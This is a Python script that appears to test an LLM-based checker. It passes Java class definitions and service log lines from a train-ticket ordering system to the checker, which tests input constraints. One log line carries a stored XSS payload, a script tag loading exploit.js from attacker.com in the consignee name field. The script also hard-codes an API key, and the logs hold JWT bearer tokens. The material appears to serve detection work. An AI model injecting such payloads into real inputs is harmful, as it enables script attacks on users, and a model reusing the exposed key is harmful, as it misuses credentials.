from gptchecker import GPTChecker

if __name__ == "__main__":
    class_name1 = "Food"

    class_name2 = "OrderTicketsInfo"

    class_definition1 = """
    FoodDeliveryOrder {

    @Id
    @GeneratedValue(generator = "jpa-uuid")
    @Column(length = 36)
    private String id;

    private String stationFoodStoreId;

    @ElementCollection(targetClass = Food.class)
    private List<Food> foodList;

    private String tripId;

    private int seatNo;

    private String createdTime;

    private String deliveryTime;

    private double deliveryFee;
}

    """

    class_definition2 = """
    public class OrderTicketsInfo {
    private String accountId;
    private String contactsId;

    private String tripId;

    private int seatType;

    private String loginToken;

    private String date;

    private String from;

    private String to;
    private int assurance;

    private int foodType = 0;

    private String stationName;

    private String storeName;

    private String foodName;

    private double foodPrice;


    private String handleDate;

    private String consigneeName;

    private String consigneePhone;

    private double consigneeWeight;

    private boolean isWithin;

    public String getFrom() {
        return StringUtils.String2Lower(this.from);
    }

    public String getTo() {
        return StringUtils.String2Lower(this.to);
    }

}

    """

    logs = [
        "2024-06-03 14:50:51.190 INFO   1 --- [http-nio-18856-exec-9] f.s.LoggingAspect: Entering in Method: getAllFood, Class: foodsearch.service.FoodServiceImpl, Arguments: [2024-06-05, shanghai, suzhou, D1345, authorization:Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJVc2VyX3Rlc3QiLCJyb2xlcyI6WyJST0xFX1VTRVIiXSwiaWQiOiI4NTVhMjNhMC02MzMxLTRmODctOGMyYi1hN2U2NDFkYWI0OGUiLCJpYXQiOjE3MTczOTc0NDEsImV4cCI6MTcxNzQwMTA0MX0.brungf8A_j36_7EvRhVR2juzkACLYpPYyk_lJwZLDLE, Return: Response(status=1, msg=Get All Food Success, data=AllTripFood(trainFoodList=[Food(foodName=Oily bean curd, price=2.0), Food(foodName=Soup, price=3.7), Food(foodName=Spicy hot noodles, price=5.0)], foodStoreListMap={suzhou=[StationFoodStore(id=77bdc35a-186b-4c78-882c-e795db8b3ea6, stationName=suzhou, storeName=Roman Holiday, telephone=3769464, businessTime=09:00-23:00, deliveryFee=15.0, foodList=[Food(foodName=Big Burger, price=1.2), Food(foodName=Bone Soup, price=2.5)])], shanghai=[StationFoodStore(id=a748ad75-92b2-4a63-af87-8e3ae6d8bf2a, stationName=shanghai, storeName=Good Taste, telephone=6228480012, businessTime=08:00-21:00, deliveryFee=10.0, foodList=[Food(foodName=Rice, price=1.2), Food(foodName=Chicken Soup, price=2.5)]), StationFoodStore(id=50db51d5-a7d0-4f5f-b63c-c8d78e4a9169, stationName=shanghai, storeName=KFC, telephone=01-234567, businessTime=10:00-20:00, deliveryFee=20.0, foodList=[Food(foodName=Hamburger, price=5.0), Food(foodName=Cola, price=2.0), Food(foodName=Chicken, price=10.5)])]}))",
        "2024-06-03 14:19:11.590 INFO   1 --- [http-nio-14568-exec-7] p.s.LoggingAspect: Entering in Method: preserve, Class: preserve.service.PreserveServiceImpl, Arguments: [OrderTicketsInfo(accountId=855a23a0-6331-4f87-8c2b-a7e641dab48e, contactsId=78e866c4-c837-49e5-8cca-a4710f967e34, tripId=D1345, seatType=2, loginToken=null, date=2024-06-05, from=shanghai, to=suzhou, assurance=0, foodType=1, stationName=, storeName=, foodName=Bone Soup, foodPrice=2.5, handleDate=2024-06-03, consigneeName=<script src=http://attacker.com/exploit.js></script>, consigneePhone=12312355, consigneeWeight=53.0, isWithin=false),  authorization:Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJVc2VyX3Rlc3QiLCJyb2xlcyI6WyJST0xFX1VTRVIiXSwiaWQiOiI4NTVhMjNhMC02MzMxLTRmODctOGMyYi1hN2U2NDFkYWI0OGUiLCJpYXQiOjE3MTczOTU1MzIsImV4cCI6MTcxNzM5OTEzMn0.fFwFdlMqvpiVw_hipDypeExVwPdKdtpWhVLJALPx3oo,  Return: Response(status=1, msg=Success., data=Success)"
    ]

    checker = GPTChecker(
        api_key="sk-proj-enNNZd2GZEkaDuRa3rPfT3BlbkFJph7uEdwchQlAXWY5gm2G",
        model="gpt-4o",
        max_tokens=2048,
        top_p=0.9,
        temperature=0.0
    )

    result = checker.check_input_constraint(
        class_name1=class_name1,
        class_name2=class_name2,
        class_definition1=class_definition1,
        class_definition2=class_definition2,
        logs=logs
    )
    print(result)
    # code_string = result[1]
    # exec(code_string)

    # # 现在可以使用 is_related 函数
    # instance_A = {'id': 123, 'price': 99.99}
    # instance_B = {'orderId': 123, 'price': 99.99}

    # print(is_related(instance_A, instance_B)) 